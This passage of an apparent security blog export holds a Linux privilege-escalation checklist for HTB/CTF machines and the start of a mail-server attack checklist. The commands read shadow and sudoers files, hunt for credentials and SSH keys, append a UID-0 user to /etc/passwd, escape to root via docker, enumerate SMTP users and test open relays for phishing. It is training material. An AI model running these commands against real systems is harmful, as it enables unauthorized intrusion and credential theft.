class=\"task-list\">\n<li class=\"task-list-item\"><label class=\"task-list-control\"><input type=\"checkbox\"/><span class=\"task-list-indicator\"></span></label> Current user and groups</li>\n</ul>\n<pre><code class=\"language-bash\">id\nwhoami\ngroups\n</code></pre>\n<ul class=\"task-list\">\n<li class=\"task-list-item\"><label class=\"task-list-control\"><input type=\"checkbox\"/><span class=\"task-list-indicator\"></span></label> List users with shell</li>\n</ul>\n<pre><code class=\"language-bash\"> who\n</code></pre>\n<ul class=\"task-list\">\n<li class=\"task-list-item\"><label class=\"task-list-control\"><input type=\"checkbox\"/><span class=\"task-list-indicator\"></span></label> Users with UID 0</li>\n</ul>\n<pre><code class=\"language-bash\">awk -F: '$3 == 0 {print}' /etc/passwd\n</code></pre>\n<ul class=\"task-list\">\n<li class=\"task-list-item\"><label class=\"task-list-control\"><input type=\"checkbox\"/><span class=\"task-list-indicator\"></span></label> Shadow file readable?</li>\n</ul>\n<pre><code class=\"language-bash\">cat /etc/shadow 2&gt;/dev/null\nls -la /etc/shadow\n</code></pre>\n<ul class=\"task-list\">\n<li class=\"task-list-item\"><label class=\"task-list-control\"><input type=\"checkbox\"/><span class=\"task-list-indicator\"></span></label> Logged-in users / last logins</li>\n</ul>\n<pre><code class=\"language-bash\">w\nwho\nlast\nlastlog 2&gt;/dev/null\n</code></pre>\n<ul class=\"task-list\">\n<li class=\"task-list-item\"><label class=\"task-list-control\"><input type=\"checkbox\"/><span class=\"task-list-indicator\"></span></label> Other users' history readable</li>\n</ul>\n<pre><code class=\"language-bash\">find /home -name &quot;.*history&quot; -readable 2&gt;/dev/null\ncat ~/.bash_history\n\n## 3 // Sudo\n\n- [ ] Sudo permissions\n```bash\nsudo -l\n</code></pre>\n<ul class=\"task-list\">\n<li class=\"task-list-item\"><label class=\"task-list-control\"><input type=\"checkbox\"/><span class=\"task-list-indicator\"></span></label> Sudo without password on some binaries? → GTFOBins</li>\n<li class=\"task-list-item\"><label class=\"task-list-control\"><input type=\"checkbox\"/><span class=\"task-list-indicator\"></span></label> Sudo version (&lt; 1.9.12p2 → CVE-2023-22809, &lt; 1.8.28 → CVE-2019-14287)</li>\n</ul>\n<pre><code class=\"language-bash\">sudo --version\n</code></pre>\n<ul class=\"task-list\">\n<li class=\"task-list-item\"><label class=\"task-list-control\"><input type=\"checkbox\"/><span class=\"task-list-indicator\"></span></label> Sudo token reuse (<code>/proc/sys/kernel/yama/ptrace_scope</code>)</li>\n</ul>\n<pre><code class=\"language-bash\">cat /proc/sys/kernel/yama/ptrace_scope\n</code></pre>\n<ul class=\"task-list\">\n<li class=\"task-list-item\"><label class=\"task-list-control\"><input type=\"checkbox\"/><span class=\"task-list-indicator\"></span></label> Sudoers file readable</li>\n</ul>\n<pre><code class=\"language-bash\">cat /etc/sudoers 2&gt;/dev/null\nls -la /etc/sudoers.d/\ncat /etc/sudoers.d/* 2&gt;/dev/null\n</code></pre>\n<hr>\n<h2 id=\"4-suid-sgid-capabilities\">4 // SUID / SGID / Capabilities</h2>\n<ul class=\"task-list\">\n<li class=\"task-list-item\"><label class=\"task-list-control\"><input type=\"checkbox\"/><span class=\"task-list-indicator\"></span></label> SUID Binaries</li>\n</ul>\n<pre><code class=\"language-bash\">find / -perm -4000 -type f 2&gt;/dev/null\n</code></pre>\n<ul class=\"task-list\">\n<li class=\"task-list-item\"><label class=\"task-list-control\"><input type=\"checkbox\"/><span class=\"task-list-indicator\"></span></label> SGID Binaries</li>\n</ul>\n<pre><code class=\"language-bash\">find / -perm -2000 -type f 2&gt;/dev/null\n</code></pre>\n<ul class=\"task-list\">\n<li class=\"task-list-item\"><label class=\"task-list-control\"><input type=\"checkbox\"/><span class=\"task-list-indicator\"></span></label> Compare SUID with GTFOBins for exploitable binaries</li>\n<li class=\"task-list-item\"><label class=\"task-list-control\"><input type=\"checkbox\"/><span class=\"task-list-indicator\"></span></label> Capabilities</li>\n</ul>\n<pre><code class=\"language-bash\">getcap -r / 2&gt;/dev/null\n</code></pre>\n<ul class=\"task-list\">\n<li class=\"task-list-item\"><label class=\"task-list-control\"><input type=\"checkbox\"/><span class=\"task-list-indicator\"></span></label> Interesting Capabilities: <code>cap_setuid</code>, <code>cap_setgid</code>, <code>cap_dac_override</code>, <code>cap_net_raw</code>, <code>cap_sys_admin</code></li>\n</ul>\n<hr>\n<h2 id=\"5-cron-jobs-and-timers\">5 // Cron Jobs and Timers</h2>\n<ul class=\"task-list\">\n<li class=\"task-list-item\"><label class=\"task-list-control\"><input type=\"checkbox\"/><span class=\"task-list-indicator\"></span></label> Current user crontab</li>\n</ul>\n<pre><code class=\"language-bash\">crontab -l\n</code></pre>\n<ul class=\"task-list\">\n<li class=\"task-list-item\"><label class=\"task-list-control\"><input type=\"checkbox\"/><span class=\"task-list-indicator\"></span></label> System crontab</li>\n</ul>\n<pre><code class=\"language-bash\">cat /etc/crontab\nls -la /etc/cron.*\ncat /etc/cron.d/*\n</code></pre>\n<ul class=\"task-list\">\n<li class=\"task-list-item\"><label class=\"task-list-control\"><input type=\"checkbox\"/><span class=\"task-list-indicator\"></span></label> Cron of other users (if readable)</li>\n</ul>\n<pre><code class=\"language-bash\">ls -la /var/spool/cron/crontabs/\n</code></pre>\n<ul class=\"task-list\">\n<li class=\"task-list-item\"><label class=\"task-list-control\"><input type=\"checkbox\"/><span class=\"task-list-indicator\"></span></label> Systemd timers</li>\n</ul>\n<pre><code class=\"language-bash\">systemctl list-timers --all 2&gt;/dev/null\n</code></pre>\n<ul class=\"task-list\">\n<li class=\"task-list-item\"><label class=\"task-list-control\"><input type=\"checkbox\"/><span class=\"task-list-indicator\"></span></label> Writable files referenced by cron</li>\n</ul>\n<pre><code class=\"language-bash\"># Identify scripts executed by cron and verify if they are writable\n</code></pre>\n<ul class=\"task-list\">\n<li class=\"task-list-item\"><label class=\"task-list-control\"><input type=\"checkbox\"/><span class=\"task-list-indicator\"></span></label> <strong>pspy</strong> — monitor processes in real time (identifies hidden cron jobs)</li>\n</ul>\n<pre><code class=\"language-bash\">./pspy64\n\n## 6 // Writable files and directories\n\n- [ ] Writable files in sensitive directories\n```bash\nfind /etc -writable -type f 2&gt;/dev/null\nfind /opt -writable -type f 2&gt;/dev/null\nfind /usr -writable -type f 2&gt;/dev/null\n</code></pre>\n<ul class=\"task-list\">\n<li class=\"task-list-item\"><label class=\"task-list-control\"><input type=\"checkbox\"/><span class=\"task-list-indicator\"></span></label> World-writable directories</li>\n</ul>\n<pre><code class=\"language-bash\">find / -writable -type d 2&gt;/dev/null | grep -v proc\n</code></pre>\n<ul class=\"task-list\">\n<li class=\"task-list-item\"><label class=\"task-list-control\"><input type=\"checkbox\"/><span class=\"task-list-indicator\"></span></label> Writable configuration files</li>\n</ul>\n<pre><code class=\"language-bash\">ls -la /etc/passwd /etc/shadow /etc/sudoers\n</code></pre>\n<ul class=\"task-list\">\n<li class=\"task-list-item\"><label class=\"task-list-control\"><input type=\"checkbox\"/><span class=\"task-list-indicator\"></span></label> Writable <code>/etc/passwd</code> → add user with UID 0</li>\n</ul>\n<pre><code class=\"language-bash\"># If writable:\nopenssl passwd -1 password123\necho 'root2:$hash:0:0:root:/root:/bin/bash' &gt;&gt; /etc/passwd\n</code></pre>\n<hr>\n<h2 id=\"7-password-and-credentials\">7 // Password and Credentials</h2>\n<ul class=\"task-list\">\n<li class=\"task-list-item\"><label class=\"task-list-control\"><input type=\"checkbox\"/><span class=\"task-list-indicator\"></span></label> Configuration files with passwords</li>\n</ul>\n<pre><code class=\"language-bash\">find / -name &quot;*.conf&quot; -exec grep -li &quot;pass\\|password\\|pwd\\|secret\\|key\\|token&quot; {} \\; 2&gt;/dev/null\nfind / -name &quot;*.cfg&quot; -exec grep -li &quot;pass\\|password&quot; {} \\; 2&gt;/dev/null\nfind / -name &quot;*.ini&quot; -exec grep -li &quot;pass\\|password&quot; {} \\; 2&gt;/dev/null\nfind / -name &quot;*.env&quot; -exec grep -li &quot;pass\\|password&quot; {} \\; 2&gt;/dev/null\n</code></pre>\n<ul class=\"task-list\">\n<li class=\"task-list-item\"><label class=\"task-list-control\"><input type=\"checkbox\"/><span class=\"task-list-indicator\"></span></label> Exposed <code>.git</code> files (config, logs with credentials)</li>\n</ul>\n<pre><code class=\"language-bash\">find / -name &quot;.git&quot; -type d 2&gt;/dev/null\n</code></pre>\n<ul class=\"task-list\">\n<li class=\"task-list-item\"><label class=\"task-list-control\"><input type=\"checkbox\"/><span class=\"task-list-indicator\"></span></label> Accessible SQLite / MySQL / PostgreSQL databases</li>\n</ul>\n<pre><code class=\"language-bash\">find / -name &quot;*.db&quot; -o -name &quot;*.sqlite&quot; -o -name &quot;*.sqlite3&quot; 2&gt;/dev/null\n</code></pre>\n<ul class=\"task-list\">\n<li class=\"task-list-item\"><label class=\"task-list-control\"><input type=\"checkbox\"/><span class=\"task-list-indicator\"></span></label> SSH keys</li>\n</ul>\n<pre><code class=\"language-bash\">find / -name &quot;id_rsa&quot; -o -name &quot;id_ecdsa&quot; -o -name &quot;id_ed25519&quot; -o -name &quot;authorized_keys&quot; 2&gt;/dev/null\nls -la /home/*/.ssh/ 2&gt;/dev/null\n</code></pre>\n<ul class=\"task-list\">\n<li class=\"task-list-item\"><label class=\"task-list-control\"><input type=\"checkbox\"/><span class=\"task-list-indicator\"></span></label> Reused passwords → try <code>dev</code> credentials on other users</li>\n</ul>\n<pre><code class=\"language-bash\">su - &lt;altro_utente&gt;\n</code></pre>\n<ul class=\"task-list\">\n<li class=\"task-list-item\"><label class=\"task-list-control\"><input type=\"checkbox\"/><span class=\"task-list-indicator\"></span></label> Credentials in environment variables or processes</li>\n</ul>\n<pre><code class=\"language-bash\">ps auxwwe 2&gt;/dev/null | grep -i pass\n</code></pre>\n<ul class=\"task-list\">\n<li class=\"task-list-item\"><label class=\"task-list-control\"><input type=\"checkbox\"/><span class=\"task-list-indicator\"></span></label> <code>.netrc</code>, <code>.pgpass</code>, <code>.my.cnf</code> files</li>\n</ul>\n<pre><code class=\"language-bash\">find /home -name &quot;.netrc&quot; -o -name &quot;.pgpass&quot; -o -name &quot;.my.cnf&quot; 2&gt;/dev/null\n</code></pre>\n<h2 id=\"8-internal-services-and-network\">8 // Internal Services and Network</h2>\n<ul class=\"task-list\">\n<li class=\"task-list-item\"><label class=\"task-list-control\"><input type=\"checkbox\"/><span class=\"task-list-indicator\"></span></label> Listening ports only on localhost</li>\n</ul>\n<pre><code class=\"language-bash\">sockstat -4 -l\nss -tlnp\nnetstat -tlnp 2&gt;/dev/null\n</code></pre>\n<ul class=\"task-list\">\n<li class=\"task-list-item\"><label class=\"task-list-control\"><input type=\"checkbox\"/><span class=\"task-list-indicator\"></span></label> Internal services not exposed (database, API, admin web app)</li>\n<li class=\"task-list-item\"><label class=\"task-list-control\"><input type=\"checkbox\"/><span class=\"task-list-indicator\"></span></label> Active connections</li>\n</ul>\n<pre><code class=\"language-bash\">ss -anp\n</code></pre>\n<ul class=\"task-list\">\n<li class=\"task-list-item\"><label class=\"task-list-control\"><input type=\"checkbox\"/><span class=\"task-list-indicator\"></span></label> ARP table (reachable hosts)</li>\n</ul>\n<pre><code class=\"language-bash\">arp -a\nip neigh\n</code></pre>\n<ul class=\"task-list\">\n<li class=\"task-list-item\"><label class=\"task-list-control\"><input type=\"checkbox\"/><span class=\"task-list-indicator\"></span></label> Network interfaces (pivot possible?)</li>\n</ul>\n<pre><code class=\"language-bash\">ip a\nip route\n</code></pre>\n<ul class=\"task-list\">\n<li class=\"task-list-item\"><label class=\"task-list-control\"><input type=\"checkbox\"/><span class=\"task-list-indicator\"></span></label> Iptables rules</li>\n</ul>\n<pre><code class=\"language-bash\">iptables -L -n 2&gt;/dev/null\n\n## 9 // Installed software and vulnerable versions\n\n- [ ] Installed packages\n```bash\ndpkg -l 2&gt;/dev/null\napt list --installed 2&gt;/dev/null\n</code></pre>\n<ul class=\"task-list\">\n<li class=\"task-list-item\"><label class=\"task-list-control\"><input type=\"checkbox\"/><span class=\"task-list-indicator\"></span></label> Manually compiled software</li>\n</ul>\n<pre><code class=\"language-bash\">ls /opt/ /usr/local/bin/ /usr/local/sbin/\n</code></pre>\n<ul class=\"task-list\">\n<li class=\"task-list-item\"><label class=\"task-list-control\"><input type=\"checkbox\"/><span class=\"task-list-indicator\"></span></label> Specific versions of known software (search for CVEs)</li>\n</ul>\n<pre><code class=\"language-bash\"># Examples:\npython3 --version\npip3 list 2&gt;/dev/null\ngit --version\n</code></pre>\n<ul class=\"task-list\">\n<li class=\"task-list-item\"><label class=\"task-list-control\"><input type=\"checkbox\"/><span class=\"task-list-indicator\"></span></label> Kernel exploits (last resort)</li>\n</ul>\n<pre><code class=\"language-bash\">uname -r\n# Search for exploits for the specific kernel version\nsearchsploit linux kernel &lt;version&gt; privilege escalation\n</code></pre>\n<h2 id=\"10-containers-and-virtualization\">10 // Containers and virtualization</h2>\n<ul class=\"task-list\">\n<li class=\"task-list-item\"><label class=\"task-list-control\"><input type=\"checkbox\"/><span class=\"task-list-indicator\"></span></label> Are we inside a Docker container?</li>\n</ul>\n<pre><code class=\"language-bash\">cat /proc/1/cgroup 2&gt;/dev/null\nls -la /.dockerenv 2&gt;/dev/null\n</code></pre>\n<ul class=\"task-list\">\n<li class=\"task-list-item\"><label class=\"task-list-control\"><input type=\"checkbox\"/><span class=\"task-list-indicator\"></span></label> Docker socket accessible</li>\n</ul>\n<pre><code class=\"language-bash\">ls -la /var/run/docker.sock 2&gt;/dev/null\n</code></pre>\n<ul class=\"task-list\">\n<li class=\"task-list-item\"><label class=\"task-list-control\"><input type=\"checkbox\"/><span class=\"task-list-indicator\"></span></label> If the user is in the <code>docker</code> group → trivial root</li>\n</ul>\n<pre><code class=\"language-bash\">docker run -v /:/mnt --rm -it alpine chroot /mnt sh\n</code></pre>\n<ul class=\"task-list\">\n<li class=\"task-list-item\"><label class=\"task-list-control\"><input type=\"checkbox\"/><span class=\"task-list-indicator\"></span></label> LXC/LXD</li>\n</ul>\n<pre><code class=\"language-bash\">id | grep -i lxd\n</code></pre>\n<hr>\n<h2 id=\"11-recently-modified-files-interesting-files\">11 // Recently modified files / interesting files</h2>\n<ul class=\"task-list\">\n<li class=\"task-list-item\"><label class=\"task-list-control\"><input type=\"checkbox\"/><span class=\"task-list-indicator\"></span></label> Recently modified files</li>\n</ul>\n<pre><code class=\"language-bash\">find / -mmin -30 -type f 2&gt;/dev/null | grep -v proc\n</code></pre>\n<ul class=\"task-list\">\n<li class=\"task-list-item\"><label class=\"task-list-control\"><input type=\"checkbox\"/><span class=\"task-list-indicator\"></span></label> Large files (dumps, backups)</li>\n</ul>\n<pre><code class=\"language-bash\">find / -size +10M -type f 2&gt;/dev/null | grep -v proc\n</code></pre>\n<ul class=\"task-list\">\n<li class=\"task-list-item\"><label class=\"task-list-control\"><input type=\"checkbox\"/><span class=\"task-list-indicator\"></span></label> Backup files</li>\n</ul>\n<pre><code class=\"language-bash\">find / -name &quot;*.bak&quot; -o -name &quot;*.old&quot; -o -name &quot;*.backup&quot; -o -name &quot;*~&quot; 2&gt;/dev/null\n</code></pre>\n<ul class=\"task-list\">\n<li class=\"task-list-item\"><label class=\"task-list-control\"><input type=\"checkbox\"/><span class=\"task-list-indicator\"></span></label> Hidden files in home directories</li>\n</ul>\n<pre><code class=\"language-bash\">find /home -name &quot;.*&quot; -type f 2&gt;/dev/null\nls -la /home/*/\n</code></pre>\n<ul class=\"task-list\">\n<li class=\"task-list-item\"><label class=\"task-list-control\"><input type=\"checkbox\"/><span class=\"task-list-indicator\"></span></label> Internal mail</li>\n</ul>\n<pre><code class=\"language-bash\">ls -la /var/mail/\ncat /var/mail/* 2&gt;/dev/null\nls -la /var/spool/mail/\n\n## 12 // Git repositories\n\n- [ ] Git repository on the machine\n```bash\nfind / -name &quot;.git&quot; -type d 2&gt;/dev/null\n</code></pre>\n<ul class=\"task-list\">\n<li class=\"task-list-item\"><label class=\"task-list-control\"><input type=\"checkbox\"/><span class=\"task-list-indicator\"></span></label> Commit logs (credentials, paths, sensitive info)</li>\n</ul>\n<pre><code class=\"language-bash\">cd &lt;repo&gt; &amp;&amp; git log --oneline\ngit log -p   # shows diff of each commit\ngit show &lt;commit_hash&gt;\n</code></pre>\n<ul class=\"task-list\">\n<li class=\"task-list-item\"><label class=\"task-list-control\"><input type=\"checkbox\"/><span class=\"task-list-indicator\"></span></label> Different branches</li>\n</ul>\n<pre><code class=\"language-bash\">git branch -a\n</code></pre>\n<ul class=\"task-list\">\n<li class=\"task-list-item\"><label class=\"task-list-control\"><input type=\"checkbox\"/><span class=\"task-list-indicator\"></span></label> Stash</li>\n</ul>\n<pre><code class=\"language-bash\">git stash list\ngit stash show -p\n\n## 13 // NFS / Mount\n\n- [ ] NFS exports\n```bash\ncat /etc/exports 2&gt;/dev/null\nshowmount -e localhost 2&gt;/dev/null\n</code></pre>\n<ul class=\"task-list\">\n<li class=\"task-list-item\"><label class=\"task-list-control\"><input type=\"checkbox\"/><span class=\"task-list-indicator\"></span></label> <code>no_root_squash</code> → mount from attacker and create SUID</li>\n<li class=\"task-list-item\"><label class=\"task-list-control\"><input type=\"checkbox\"/><span class=\"task-list-indicator\"></span></label> Mount points</li>\n</ul>\n<pre><code class=\"language-bash\">mount\ncat /etc/fstab\n\n## 14 // Wildcard Injection / Path Hijacking\n\n- [ ] Root scripts using wildcards (`*`) with tar, chown, rsync\n- [ ] Root scripts with relative PATH → create malicious binary in PATH\n- [ ] Shared library hijacking\n```bash\n# Check LD_LIBRARY_PATH, LD_PRELOAD\necho $LD_LIBRARY_PATH\necho $LD_PRELOAD\ncat /etc/ld.so.conf\n</code></pre>\n<hr>\n<h2 id=\"15-automated-enumeration\">15 // Automated Enumeration</h2>\n<ul class=\"task-list\">\n<li class=\"task-list-item\"><label class=\"task-list-control\"><input type=\"checkbox\"/><span class=\"task-list-indicator\"></span></label> <strong>LinPEAS</strong></li>\n</ul>\n<pre><code class=\"language-bash\">./linpeas.sh | tee linpeas_output.txt\n</code></pre>\n<ul class=\"task-list\">\n<li class=\"task-list-item\"><label class=\"task-list-control\"><input type=\"checkbox\"/><span class=\"task-list-indicator\"></span></label> <strong>pspy</strong> (process monitoring)</li>\n</ul>\n<pre><code class=\"language-bash\">./pspy64 | tee pspy_output.txt\n</code></pre>\n<hr>\n<h2 id=\"related-machines\">Related Machines</h2>\n<table>\n<thead>\n<tr>\n<th>Machine</th>\n<th>Technique</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>BoardLight</td>\n<td>SUID <code>enlightenment_sys</code> (CVE-2022-37706) → arbitrary <code>chown</code> primitive → root</td>\n</tr>\n<tr>\n<td>Broker</td>\n<td>Sudo entry for <code>nginx</code> + writable shared library → <code>.so</code> hijack on next sudo call</td>\n</tr>\n<tr>\n<td>Clicker</td>\n<td>Path-traversal + <code>SETENV</code> in sudoers → Perl SUID with controlled <code>@INC</code></td>\n</tr>\n<tr>\n<td>Codify</td>\n<td><code>sudo /opt/scripts/mysql-backup.sh</code> + bash glob injection + process snooping → <code>joshua</code>'s sudo password</td>\n</tr>\n<tr>\n<td>Devvortex</td>\n<td>CVE-2023-1326 in <code>apport-cli</code> (less/pager escape) → root</td>\n</tr>\n<tr>\n<td>Editorial</td>\n<td><code>sudo /opt/internal_apps/clean_db/repo_path.py</code> — GitPython CVE-2022-24439 → arbitrary git config → exec</td>\n</tr>\n<tr>\n<td>Jarvis</td>\n<td>SUID <code>systemctl</code> — craft a service unit that runs as root on <code>start</code></td>\n</tr>\n<tr>\n<td>Poison</td>\n<td>VNC password file on FreeBSD — <code>vncpwd</code> decode → VNC into the root session</td>\n</tr>\n<tr>\n<td>Popcorn</td>\n<td>Kernel CVE-2010-0832 (PAM MOTD) — pre-modern-mitigation Ubuntu kernel exploit</td>\n</tr>\n<tr>\n<td>SolidState</td>\n<td>World-writable script invoked by a 1-minute cron as root → drop a reverse shell, wait</td>\n</tr>\n<tr>\n<td>Tartar Sauce</td>\n<td>Cron + symlink race against <code>tar -zxvf</code> preserving SUID — drop SUID <code>bash</code> via the race</td>\n</tr>\n</tbody>\n</table>"
    },
    {
      "title": "Mail Server — Enumeration and Exploitation Checklist",
      "slug": "mail-server-enumeration-and-exploitation-checklist",
      "date": "2026·02·20",
      "tags": [
        "htb",
        "mail",
        "smtp",
        "imap",
        "pop3",
        "enumeration",
        "enum"
      ],
      "desc": "Context Checklist for enumeration and attack of mail servers on HTB/CTF machines. Covers: SMTP, IMAP, POP3 — technology-agnostic (Exchange, hMailServer, Postfix, Dovecot, Zimbra, Exim). Available tools: nmap, swaks, telnet, nc, hydra, curl, smtp-user-enum, evolution/thunderbird",
      "body": "<h1 id=\"mail-server-enumeration-exploitation-checklist\">Mail Server // Enumeration &amp; Exploitation Checklist</h1>\n<blockquote>\n<p><strong>Context</strong><br>\nChecklist for enumeration and attack of <strong>mail servers</strong> on HTB/CTF machines.\nCovers: SMTP, IMAP, POP3 — technology-agnostic (Exchange, hMailServer, Postfix, Dovecot, Zimbra, Exim).\nAvailable tools: nmap, swaks, telnet, nc, hydra, curl, smtp-user-enum, evolution/thunderbird</p>\n</blockquote>\n<hr>\n<h2 id=\"0-identification\">0 // Identification</h2>\n<ul class=\"task-list\">\n<li class=\"task-list-item\"><label class=\"task-list-control\"><input type=\"checkbox\"/><span class=\"task-list-indicator\"></span></label> Standard nmap ports</li>\n</ul>\n<pre><code class=\"language-bash\">nmap -sC -sV -p 25,110,143,465,587,993,995,2525 &lt;TARGET&gt;\n</code></pre>\n<table>\n<thead>\n<tr>\n<th>Port</th>\n<th>Service</th>\n<th>Notes</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>25</td>\n<td>SMTP</td>\n<td>Mail sending (server-to-server)</td>\n</tr>\n<tr>\n<td>465</td>\n<td>SMTPS</td>\n<td>SMTP over SSL (deprecated but still used)</td>\n</tr>\n<tr>\n<td>587</td>\n<td>SMTP Submission</td>\n<td>Mail sending (client-to-server, with auth)</td>\n</tr>\n<tr>\n<td>110</td>\n<td>POP3</td>\n<td>Mail reading (download and delete)</td>\n</tr>\n<tr>\n<td>995</td>\n<td>POP3S</td>\n<td>POP3 over SSL</td>\n</tr>\n<tr>\n<td>143</td>\n<td>IMAP</td>\n<td>Mail reading (keeps on server)</td>\n</tr>\n<tr>\n<td>993</td>\n<td>IMAPS</td>\n<td>IMAP over SSL</td>\n</tr>\n<tr>\n<td>2525</td>\n<td>Alternative SMTP</td>\n<td>Used by some providers as an alternative port</td>\n</tr>\n</tbody>\n</table>\n<ul class=\"task-list\">\n<li class=\"task-list-item\"><label class=\"task-list-control\"><input type=\"checkbox\"/><span class=\"task-list-indicator\"></span></label> Banner grabbing</li>\n</ul>\n<pre><code class=\"language-bash\"># SMTP\nnc -nv &lt;TARGET&gt; 25\ntelnet &lt;TARGET&gt; 25\n# Wait for the banner, e.g.: &quot;220 mailing.htb ESMTP hMailServer&quot;\n\n# IMAP\nnc -nv &lt;TARGET&gt; 143\n# Banner e.g.: &quot;* OK IMAPrev1&quot;\n\n# POP3\nnc -nv &lt;TARGET&gt; 110\n# Banner e.g.: &quot;+OK POP3&quot;\n</code></pre>\n<ul class=\"task-list\">\n<li class=\"task-list-item\"><label class=\"task-list-control\"><input type=\"checkbox\"/><span class=\"task-list-indicator\"></span></label> Nmap NSE scripts</li>\n</ul>\n<pre><code class=\"language-bash\"># SMTP\nnmap --script smtp-commands,smtp-enum-users,smtp-ntlm-info,smtp-open-relay,smtp-vuln-cve2010-4344 -p 25,465,587 &lt;TARGET&gt;\n\n# IMAP\nnmap --script imap-capabilities,imap-ntlm-info -p 143,993 &lt;TARGET&gt;\n\n# POP3\nnmap --script pop3-capabilities,pop3-ntlm-info -p 110,995 &lt;TARGET&gt;\n</code></pre>\n<ul class=\"task-list\">\n<li class=\"task-list-item\"><label class=\"task-list-control\"><input type=\"checkbox\"/><span class=\"task-list-indicator\"></span></label> Identify software and version from the banner</li>\n</ul>\n<table>\n<thead>\n<tr>\n<th>Banner keyword</th>\n<th>Software</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td><code>hMailServer</code></td>\n<td>hMailServer (Windows)</td>\n</tr>\n<tr>\n<td><code>Microsoft ESMTP MAIL</code></td>\n<td>Exchange / IIS SMTP</td>\n</tr>\n<tr>\n<td><code>Postfix</code></td>\n<td>Postfix (Linux)</td>\n</tr>\n<tr>\n<td><code>Dovecot</code></td>\n<td>Dovecot (IMAP/POP3, Linux)</td>\n</tr>\n<tr>\n<td><code>Zimbra</code></td>\n<td>Zimbra Collaboration Suite</td>\n</tr>\n<tr>\n<td><code>Exim</code></td>\n<td>Exim (Linux)</td>\n</tr>\n<tr>\n<td><code>Courier</code></td>\n<td>Courier Mail Server</td>\n</tr>\n<tr>\n<td><code>MailEnable</code></td>\n<td>MailEnable (Windows)</td>\n</tr>\n<tr>\n<td><code>OpenSMTPD</code></td>\n<td>OpenSMTPD (BSD/Linux)</td>\n</tr>\n</tbody>\n</table>\n<hr>\n<h2 id=\"1-smtp-enumeration\">1 // SMTP Enumeration</h2>\n<h3 id=\"manual-smtp-commands\">Manual SMTP Commands</h3>\n<pre><code class=\"language-bash\">telnet &lt;TARGET&gt; 25\n</code></pre>\n<pre><code>EHLO test.local          # Server capabilities\nVRFY &lt;user&gt;              # Checks if user exists\nEXPN &lt;alias&gt;             # Expands mailing list / alias\nMAIL FROM:&lt;attacker@test.local&gt;\nRCPT TO:&lt;user@target.htb&gt;   # Checks recipient (user enum)\n</code></pre>\n<blockquote>\n<p><strong>VRFY / EXPN / RCPT TO</strong><br>\nNot all servers support <code>VRFY</code> and <code>EXPN</code> (often disabled).\n<code>RCPT TO</code> and the most reliable method for user enumeration: response <code>250</code> = user exists, <code>550</code> = user does not exist.</p>\n</blockquote>\n<h3 id=\"smtp-user-enum\">smtp-user-enum</h3>\n<pre><code class=\"language-bash\"># VRFY method\nsmtp-user-enum -M VRFY -U /usr/share/seclists/Usernames/Names/names.txt -t &lt;TARGET&gt;\n\n# RCPT method (more reliable)\nsmtp-user-enum -M RCPT -U /usr/share/seclists/Usernames/Names/names.txt -t &lt;TARGET&gt; -D &lt;DOMAIN&gt;\n\n# EXPN method\nsmtp-user-enum -M EXPN -U /usr/share/seclists/Usernames/Names/names.txt -t &lt;TARGET&gt;\n</code></pre>\n<h3 id=\"ntlm-information-leak\">NTLM Information Leak</h3>\n<blockquote>\n<p><strong>NTLM leak via SMTP</strong><br>\nIf the server supports NTLM authentication, you can extract internal domain information (hostname, FQDN, AD domain) without authentication.</p>\n</blockquote>\n<pre><code class=\"language-bash\">nmap --script smtp-ntlm-info -p 25,587 &lt;TARGET&gt;\n\n# Manual with telnet\ntelnet &lt;TARGET&gt; 25\nEHLO test\nAUTH NTLM\n# Send base64 of an empty NTLM Type 1 message:\nTlRMTVNTUAABAAAAB4IIAAAAAAAAAAAAAAAAAAAAAAA=\n# The server responds with a Type 2 challenge containing domain and hostname\n</code></pre>\n<h3 id=\"open-relay-test\">Open Relay Test</h3>\n<pre><code class=\"language-bash\"># Test with nmap\nnmap --script smtp-open-relay -p 25 &lt;TARGET&gt;\n\n# Manual test\ntelnet &lt;TARGET&gt; 25\nEHLO test.local\nMAIL FROM:&lt;test@attacker.com&gt;\nRCPT TO:&lt;test@gmail.com&gt;\nDATA\nSubject: Relay Test\nTest\n.\n# If it accepts = open relay\n</code></pre>\n<blockquote>\n<p><strong>Open Relay</strong><br>\nAn open relay allows sending mail to any recipient without authentication. Useful for:\n- Internal phishing (sending mail as a legitimate user of the domain)\n- Bypassing SPF/DMARC if the relay is in the target domain</p>\n</blockquote>\n<h2 id=\"2-imap-pop3-enumeration\">2 // IMAP / POP3 Enumeration</h2>\n<h3 id=\"imap-connection-and-reading\">IMAP // Connection and Reading</h3>\n<pre><code class=\"language-bash\"># Without SSL\nnc -nv &lt;TARGET&gt; 143\n</code></pre>\n<pre><code>a1 LOGIN &lt;user&gt; &lt;password&gt;\na2 LIST &quot;&quot; &quot;*&quot;                    # List mailboxes\na3 SELECT INBOX                   # Select inbox\na4 SEARCH ALL                     # List all messages\na4 SEARCH UNSEEN                 # Only unread\na5 FETCH 1 BODY[]                # Read message 1 (complete)\na5 FETCH 1 BODY[HEADER]          # Header only\na5 FETCH 1:* (FLAGS BODY[HEADER.FIELDS (FROM TO SUBJECT DATE)])  # Overview\na6 LOGOUT\n</code></pre>\n<pre><code class=\"language-bash\"># With SSL\nopenssl s_client -connect &lt;TARGET&gt;:993 -crlf -quiet\n# Then same IMAP commands\n</code></pre>\n<h3 id=\"pop3-connection-and-reading\">POP3 // Connection and Reading</h3>\n<pre><code class=\"language-bash\"># Without SSL\nnc -nv &lt;TARGET&gt; 110\n</code></pre>\n<pre><code>USER &lt;user&gt;\nPASS &lt;password&gt;\nLIST                              # List messages\nSTAT                              # Number of messages and total size\nRETR 1                            # Read message 1\nTOP 1 0                           # Header of message 1 only\nQUIT\n</code></pre>\n<pre><code class=\"language-bash\"># With SSL\nopenssl s_client -connect &lt;TARGET&gt;:995 -crlf -quiet\n</code></pre>\n<h3 id=\"curl-quick-reading\">Curl // Quick Reading</h3>\n<pre><code class=\"language-bash\"># IMAP // list mailboxes\ncurl -k &quot;imaps://&lt;TARGET&gt;&quot; --user &quot;&lt;user&gt;:&lt;password&gt;&quot;\n\n# IMAP // list messages in INBOX\ncurl -k &quot;imaps://&lt;TARGET&gt;/INBOX&quot; --user &quot;&lt;user&gt;:&lt;password&gt;&quot;\n\n# IMAP // read specific message\ncurl -k &quot;imaps://&lt;TARGET&gt;/INBOX;UID=1&quot; --user &quot;&lt;user&gt;:&lt;password&gt;&quot;\n\n# POP3\ncurl -k 